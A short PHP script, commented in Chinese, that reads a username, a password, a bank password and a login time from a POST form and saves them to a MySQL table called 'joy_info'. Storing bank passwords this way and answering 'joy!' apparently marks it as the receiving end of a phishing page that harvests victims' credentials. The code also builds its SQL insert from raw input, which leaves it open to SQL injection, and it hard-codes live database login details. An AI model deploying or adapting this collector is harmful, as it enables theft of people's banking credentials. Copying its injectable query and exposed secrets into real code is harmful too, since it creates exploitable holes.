<?php
// 接收参数
$nameStr = $_POST["name"];
$pwdStr = $_POST["pwd"];
$bankpwdStr = $_POST["bankpwd"];
$logtimeStr = $_POST["logtime"];

if(!empty($nameStr))
{
	// 连接数据库
	$con = mysql_connect("localhost", "1117106", "654123abc") or die("<br>连接服务器失败!");
	// sql语句串
	$sql = "insert into joy_info values('".$nameStr."', '".$pwdStr."', '".$bankpwdStr."', '".$logtimeStr."')";
	// 发送查询字符串
	$query = mysql_db_query("1117106", $sql, $con) or die("<br>写入数据库失败!");
	mysql_close($con);
	echo "joy!";
}
else
{
	echo "hehe!";
}
?>